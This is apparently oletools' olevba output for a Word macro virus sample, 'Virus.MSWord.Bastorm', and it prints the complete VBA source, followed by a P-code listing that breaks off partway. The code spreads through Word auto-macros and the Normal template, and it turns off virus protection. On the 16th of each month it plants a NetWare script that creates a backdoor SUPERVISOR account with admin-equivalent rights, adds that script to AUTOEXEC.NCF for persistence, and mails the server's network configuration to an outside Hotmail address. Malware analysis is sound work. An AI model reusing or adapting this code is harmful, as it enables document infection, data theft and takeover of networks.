olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bastorm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bastorm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO StormBringer.bas 
in file: Virus.MSWord.Bastorm - OLE stream: 'Macros/VBA/StormBringer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'  By StormBringer
'  March, 2000
Dim Servidor As String
Dim CxPostal As String
Dim FullName As String
Dim DocName As String
Dim CriouScript As String
Dim AlterouNCF As String
Dim RemoviHate As String
Sub ArquivoSalvar()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Storm
    ActiveDocument.Save
End Sub
Sub AutoExec()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Options.VirusProtection = False
    Storm
End Sub
Sub AutoOpen()
    On Error Resume Next
    Options.VirusProtection = False
    Application.EnableCancelKey = wdCancelDisabled
    Storm
End Sub
Sub AutoNew()
    On Error Resume Next
    Options.VirusProtection = False
    Application.EnableCancelKey = wdCancelDisabled
    Storm
End Sub
Sub AutoClose()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Storm
End Sub
Function Storm()
    On Error GoTo Sair
    Application.EnableCancelKey = wdCancelDisabled
    Application.DisplayAlerts = wdAlertsNone
    Inicia_Variaveis
    Infecta
    If (Day(Now()) = 16) Then Gravar
    Open "C:\Storm.log" For Append As #1
    If DocName = "" Then GoTo Sair
    Print #1, ""
    Print #1, "Registro de " & Format(Time, "hh:mm:ss AMPM - ") & Format(Date, "dddd, d mmm yyyy")
    Print #1, " " & DocName
    Print #1, " " & RemoviHate
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        Print #1, "  - " & ActiveDocument.VBProject.VBComponents(I).Name
    Next
    Close #1
Sair:
    Close #1
End Function
Sub Inicia_Variaveis()
    On Error GoTo Sair
    Servidor = System.PrivateProfileString("MBMail.ini", "MHS", "MasterVolume")
    CxPostal = System.PrivateProfileString("MBMail.ini", "MHS", "MailBox")
    FullName = System.PrivateProfileString("MBMail.ini", "MHS", "FullName")
    DocName = Application.ActiveDocument.Name
Sair:
End Sub
Sub Gravar()
Dim Fileorg As String
Dim FileDest As String
    On Error GoTo Sair
    Cria_Script
    Altera_NCF
    Saida = Servidor & "MHS\MAIL\SND\BABACAS1"
    FileDest = Servidor & "MHS\MAIL\PARCEL\queroa5t"
    Fileorg = Servidor & "ETC\NETINFO.CFG"
    FileCopy Fileorg, FileDest
    Open Saida For Output As #1
    Print #1, "SMF-71"
    Print #1, "From: " & CxPostal
    Print #1, "To: StormBringer23@hotmail.com"
    Print #1, "Subject: Pronto de informação"
    Print #1, "Attachment-name: NetInfo.cfg"
    Print #1, "Attachment-encoding: IBM-437"
    Print #1, "Attachment: queroa5t"
    Print #1, ""
    Print #1, "Registro de " & Format(Time, "hh:mm:ss AMPM - ") & Format(Date, "dddd, d mmm yyyy")
    Print #1, "WordName : " & Application.UserName
    Print #1, "Documento: " & DocName
    Print #1, "Servidor : " & Servidor
    Print #1, "Nome NGM : " & FullName
    Print #1, "Caixa Postal: " & CxPostal
    Print #1, CriouScript
    Print #1, AlterouNCF
    Close #1
Sair:
End Sub
Sub Cria_Script()
    On Error GoTo Sair
    CriouScript = "Não criou script"
    Saida = Servidor & "NETBASIC\UTIL\STORM.BAS"
    Open Saida For Output As #1
    Print #1, "#include " & Chr(34) & "net.h" & Chr(34)
    Print #1, "#include " & Chr(34) & "fio.h" & Chr(34)
    Print #1, ""
    Print #1, "SUB CRIA"
    Print #1, "    BINDOBJ = NET:BINDERY:GET"
    Print #1, "    BINDOBJ.Type = NET_USER"
    Print #1, "    BINDOBJ.Name = " & Chr(34) & "SUPERVISOR" & Chr(34)
    Print #1, "    BINDOBJ.Password = " & Chr(34) & "SUPERVISOR" & Chr(34)
    Print #1, "    BINDOBJ = NET:BINDERY:SET(BINDOBJ)"
    Print #1, "    RETURN"
    Print #1, "END SUB"
    Print #1, ""
    Print #1, "SUB IGUALA"
    Print #1, "    PROP = " & Chr(34) & "SECURITY_EQUALS" & Chr(34)
    Print #1, "    BIN1 = NET:BINDERY:GET(" & Chr(34) & "SUPERVISOR" & Chr(34) & ",NET_USER)"
    Print #1, "    BIN2 = NET:BINDERY:GET(" & Chr(34) & "ADMIN" & Chr(34) & ",NET_USER)"
    Print #1, "    IF (NET:BINDERY:PROPERTY:MEMBER:ADD(BIN1,PROP,BIN2))"
    Print #1, "       RETURN(TRUE)"
    Print #1, "    ENDIF"
    Print #1, "    RETURN"
    Print #1, "END SUB"
    Print #1, ""
    Print #1, "SUB TROCA"
    Print #1, "    BINDOBJ = NET:BINDERY:GET(" & Chr(34) & "SUPERVISOR" & Chr(34) & ",NET_USER)"
    Print #1, "    BINDOBJ.Password = " & Chr(34) & "SUPERVISOR" & Chr(34)
    Print #1, "    BINDOBJ = NET:BINDERY:SET(BINDOBJ)"
    Print #1, "    RETURN"
    Print #1, "END SUB"
    Print #1, ""
    Print #1, "SUB RELATE"
    Print #1, "    HANDLE = FIO:OPEN(" & Chr(34) & "SYS:MHS\MAIL\SND\ABRACADA" & Chr(34) & ",FIO_CREATE_APPEND_WRITE+FIO_TEXT)"
    Print #1, "    ANTIGO = FIO:OUTPUT:SELECT(HANDLE)"
    Print #1, "    PRINT (" & Chr(34) & "SMF-71" & Chr(34) & "); NEWLINE"
    Print #1, "    PRINT (" & Chr(34) & "TO: stormbringer23@hotmail.com" & Chr(34) & "); NEWLINE"
    Print #1, "    PRINT (" & Chr(34) & "FROM: " & CxPostal & Chr(34) & "); NEWLINE"
    Print #1, "    PRINT (" & Chr(34) & "SUBJECT: Notificando serviço" & Chr(34) & "); NEWLINE"
    Print #1, "    NEWLINE"
    Print #1, "    PRINT (" & Chr(34) & "CARO AMIGO, A PORTA ESTA OK" & Chr(34) & "); NEWLINE"
    Print #1, "    NEWLINE"
    Print #1, "    FIO:OUTPUT:SELECT(ANTIGO)"
    Print #1, "    FIO:CLOSE(HANDLE)"
    Print #1, "    RETURN(TRUE)"
    Print #1, "END SUB"
    Print #1, ""
    Print #1, "SUB MAIN"
    Print #1, "    CRIA"
    Print #1, "    IGUALA"
    Print #1, "    TROCA"
    Print #1, "    RELATE"
    Print #1, "END SUB"
    Close #1
    CriouScript = "Criou script"
Sair:
End Sub
Sub Altera_NCF()
    On Error GoTo Sair
    AlterouNCF = "Não alterou NCF"
    If Not Existe_Entrada Then
       Saida = Servidor & "SYSTEM\AUTOEXEC.NCF"
       Open Saida For Append As #1
       Print #1, ""
       Print #1, "LOAD NETBASIC STORM.BAS"
       Close #1
       AlterouNCF = "Alterou NCF"
    Else
       AlterouNCF = "Já existia entrada no NCF"
    End If
Sair:
End Sub
Function Existe_Entrada() As Boolean
    Dim Frase As String
    Existe_Entrada = False
    On Error GoTo Sair
    Saida = Servidor & "SYSTEM\AUTOEXEC.NCF"
    Open Saida For Input As #1
    Do While Not EOF(1)
       Input #1, Frase
       If Frase = "LOAD NETBASIC STORM.BAS" Then
          Existe_Entrada = True
       End If
    Loop
    Close #1
Sair:
End Function
Sub Infecta()
On Error GoTo Final
   Dim I, J As Integer
   Dim Hate_presente As Boolean
   Set ActiveDoc = ActiveDocument
   Set GlobalDoc = NormalTemplate
   DocumentInstalled = False
   GlobalInstalled = False
   For I = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents(I).Name = "StormBringer" Then
         DocumentInstalled = True
      End If
   Next
   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
      If NormalTemplate.VBProject.VBComponents(J).Name = "StormBringer" Then
         GlobalInstalled = True
      End If
   Next
   If DocumentInstalled = False Then
      Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="StormBringer", Object:=wdOrganizerObjectProjectItems
   End If
   If GlobalInstalled = False Then
      Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="StormBringer", Object:=wdOrganizerObjectProjectItems
   End If
Final:
End Sub
Sub Copia_ThisDoc()
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="StormBringer", Object:=wdOrganizerObjectProjectItems
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Bastorm
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/StormBringer - 12893 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0011 "  By StormBringer"
' Line #1:
' 	QuoteRem 0x0000 0x000D "  March, 2000"
' Line #2:
' 	Dim 
' 	VarDefn Servidor (As String)
' Line #3:
' 	Dim 
' 	VarDefn CxPostal (As String)
' Line #4:
' 	Dim 
' 	VarDefn FullName (As String)
' Line #5:
' 	Dim 
' 	VarDefn DocName (As String)
' Line #6:
' 	Dim 
' 	VarDefn CriouScript (As String)
' Line #7:
' 	Dim 
' 	VarDefn AlterouNCF (As String)
' Line #8:
' 	Dim 
' 	VarDefn RemoviHate (As String)
' Line #9:
' 	FuncDefn (Sub ArquivoSalvar())
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #12:
' 	ArgsCall Storm 0x0000 
' Line #13:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Sub AutoExec())
' Line #16:
' 	OnError (Resume Next) 
' Line #17:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #19:
' 	ArgsCall Storm 0x0000 
' Line #20:
' 	EndSub 
' Line #21:
' 	FuncDefn (Sub AutoOpen())
' Line #22:
' 	OnError (Resume Next) 
' Line #23:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #24:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #25:
' 	ArgsCall Storm 0x0000 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Sub AutoNew())
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #30:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #31:
' 	ArgsCall Storm 0x0000 
' Line #32:
' 	EndSub 
' Line #33:
' 	FuncDefn (Sub AutoClose())
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #36:
' 	ArgsCall Storm 0x0000 
' Line #37:
' 	EndSub 
' Line #38:
' 	FuncDefn (Function Storm())
' Line #39:
' 	OnError Sair 
' Line #40:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #41:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #42:
' 	ArgsCall Inicia_Variaveis 0x0000 
' Line #43:
' 	ArgsCall Infecta 0x0000 
' Line #44:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Gravar 0x0000 
' 	EndIf 
' Line #45:
' 	LitStr 0x000C "C:\Storm.log"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #46:
' 	Ld DocName 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Sair 
' 	EndIf 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "Registro de "
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 " "
' 	Ld DocName 
' 	Concat 
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 " "
' 	Ld RemoviHate 
' 	Concat 
' 	PrintItemNL 
' Line #51:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "  - "
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Concat 
' 	PrintItemNL 
' Line #53:
' 	StartForVariable 
' 	Next 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #55:
' 	Label Sair 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #57:
' 	EndFunc 
' Line #58:
' 	FuncDefn (Sub Inicia_Variaveis())
' Line #59:
' 	OnError Sair 
' Line #60:
' 	LitStr 0x000A "MBMail.ini"
' 	LitStr 0x0003 "MHS"
' 	LitStr 0x000C "MasterVolume"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St Servidor 
' Line #61:
' 	LitStr 0x000A "MBMail.ini"
' 	LitStr 0x0003 "MHS"
' 	LitStr 0x0007 "MailBox"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St CxPostal 
' Line #62:
' 	LitStr 0x000A "MBMail.ini"
' 	LitStr 0x0003 "MHS"
' 	LitStr 0x0008 "FullName"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St FullName 
' Line #63:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd New 
' 	St DocName 
' Line #64:
' 	Label Sair 
' Line #65:
' 	EndSub 
' Line #66:
' 	FuncDefn (Sub Gravar())
' Line #67:
' 	Dim 
' 	VarDefn Fileorg (As String)
' Line #68:
' 	Dim 
' 	VarDefn FileDest (As String)
' Line #69:
' 	OnError Sair 
' Line #70:
' 	ArgsCall Cria_Script 0x0000 
' Line #71:
' 	ArgsCall Altera_NCF 0x0000 
' Line #72:
' 	Ld Servidor 
' 	LitStr 0x0015 "MHS\MAIL\SND\BABACAS1"
' 	Concat 
' 	St Saida 
' Line #73:
' 	Ld Servidor 
' 	LitStr 0x0018 "MHS\MAIL\PARCEL\queroa5t"
' 	Concat 
' 	St FileDest 
' Line #74:
' 	Ld Servidor 
' 	LitStr 0x000F "ETC\NETINFO.CFG"
' 	Concat 
' 	St Fileorg 
' Line #75:
' 	Ld Fileorg 
' 	Ld FileDest 
' 	ArgsCall FileCopy 0x0002 
' Line #76:
' 	Ld Saida 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "SMF-71"
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "From: "
' 	Ld CxPostal 
' 	Concat 
' 	PrintItemNL 
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "To: StormBringer23@hotmail.com"
' 	PrintItemNL 
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Subject: Pronto de informação"
' 	PrintItemNL 
' Line #81:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "Attachment-name: NetInfo.cfg"
' 	PrintItemNL 
' Line #82:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "Attachment-encoding: IBM-437"
' 	PrintItemNL 
' Line #83:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attachment: queroa5t"
' 	PrintItemNL 
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "Registro de "
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	PrintItemNL 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "WordName : "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	PrintItemNL 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Documento: "
' 	Ld DocName 
' 	Concat 
' 	PrintItemNL 
' Line #88:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Servidor : "
' 	Ld Servidor 
' 	Concat 
' 	PrintItemNL 
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Nome NGM : "
' 	Ld FullName 
' 	Concat 
' 	PrintItemNL 
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Caixa Postal: "
' 	Ld CxPostal 
' 	Concat 
' 	PrintItemNL 
' Line #91:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld CriouScript 
' 	PrintItemNL 
' Line #92:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld AlterouNCF 
' 	PrintItemNL 
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #94:
' 	Label Sair 
' Line #95:
' 	EndSub 
' Line #96:
' 	FuncDefn (Sub Cria_Script())
' Line #97:
' 	OnError Sair 
' Line #98:
' 	LitStr 0x0010 "Não criou script"
' 	St CriouScript 
' Line #99:
' 	Ld Servidor 
' 	LitStr 0x0017 "NETBASIC\UTIL\STORM.BAS"
' 	Concat 
' 	St Saida 
' Line #100:
' 	Ld Saida 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #101:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "#include "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "net.h"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #102:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "#include "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "fio.h"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #104:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "SUB CRIA"
' 	PrintItemNL 
' Line #105:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "    BINDOBJ = NET:BINDERY:GET"
' 	PrintItemNL 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "    BINDOBJ.Type = NET_USER"
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "    BINDOBJ.Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A "SUPERVISOR"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "    BINDOBJ.Password = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A "SUPERVISOR"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #109:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "    BINDOBJ = NET:BINDERY:SET(BINDOBJ)"
' 	PrintItemNL 
' Line #110:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "    RETURN"
' 	PrintItemNL 
' Line #111:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "END SUB"
' 	PrintItemNL 
' Line #112:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #113:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "SUB IGUALA"
' 	PrintItemNL 
' Line #114:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "    PROP = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000F "SECURITY_EQUALS"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #115:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "    BIN1 = NET:BINDERY:GET("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A "SUPERVISOR"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A ",NET_USER)"
' 	Concat 
' 	PrintItemNL 
' Line #116:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "    BIN2 = NET:BINDERY:GET("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "ADMIN"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A ",NET_USER)"
' 	Concat 
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0038 "    IF (NET:BINDERY:PROPERTY:MEMBER:ADD(BIN1,PROP,BIN2))"
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "       RETURN(TRUE)"
' 	PrintItemNL 
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "    ENDIF"
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "    RETURN"
' 	PrintItemNL 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "END SUB"
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "SUB TROCA"
' 	PrintItemNL 
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "    BINDOBJ = NET:BINDERY:GET("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A "SUPERVISOR"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A ",NET_USER)"
' 	Concat 
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "    BINDOBJ.Password = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A "SUPERVISOR"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #126:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "    BINDOBJ = NET:BINDERY:SET(BINDOBJ)"
' 	PrintItemNL 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "    RETURN"
' 	PrintItemNL 
' Line #128:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "END SUB"
' 	PrintItemNL 
' Line #129:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "SUB RELATE"
' 	PrintItemNL 
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "    HANDLE = FIO:OPEN("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0019 "SYS:MHS\MAIL\SND\ABRACADA"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0022 ",FIO_CREATE_APPEND_WRITE+FIO_TEXT)"
' 	Concat 
' 	PrintItemNL 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "    ANTIGO = FIO:OUTPUT:SELECT(HANDLE)"
' 	PrintItemNL 
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "    PRINT ("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "SMF-71"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A "); NEWLINE"
' 	Concat 
' 	PrintItemNL 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "    PRINT ("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001E "TO: stormbringer23@hotmail.com"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A "); NEWLINE"
' 	Concat 
' 	PrintItemNL 
' Line #135:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "    PRINT ("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "FROM: "
' 	Concat 
' 	Ld CxPostal 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A "); NEWLINE"
' 	Concat 
' 	PrintItemNL 
' Line #136:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "    PRINT ("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001C "SUBJECT: Notificando serviço"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A "); NEWLINE"
' 	Concat 
' 	PrintItemNL 
' Line #137:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "    NEWLINE"
' 	PrintItemNL 
' Line #138:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "    PRINT ("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001B "CARO AMIGO, A PORTA ESTA OK"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A "); NEWLINE"
' 	Concat 
' 	PrintItemNL 
' Line #139:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "    NEWLINE"
' 	PrintItemNL 
' Line #140:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "    FIO:OUTPUT:SELECT(ANTIGO)"
' 	PrintItemNL 
' Line #141:
' 	LitDI2 0x0001 
' 	Sharp 
